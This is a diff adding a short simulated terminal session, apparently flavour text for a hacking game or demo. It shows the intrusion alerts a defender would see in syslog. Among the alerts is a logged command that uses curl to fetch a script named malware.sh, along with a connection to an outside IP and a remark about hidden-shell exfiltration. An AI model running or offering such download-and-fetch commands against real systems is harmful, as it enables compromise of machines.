@@ -1,0 +1,15 @@
+> view_target_sim
+
+[+] Entering TARGET SIMULATION VIEW...
+[+] Simulating what the blue team / analyst would see...
+
+> tail -f /var/log/syslog
+
+[!] Unauthorized sudo attempt from user: ghostrunner
+[!] SSH key mismatch detected in /home/admin/.ssh/known_hosts
+[!] Process launched: /tmp/ps_inject.py (PID: 4421)
+[!] Connection to 185.102.67.90 established via /dev/null tunnel
+[!] Executing: curl http://update-server.internal/malware.sh
+
+# Analyst perspective:
+# This box is on fire. Meanwhile, the operator is calmly exfiltrating on a hidden shell.
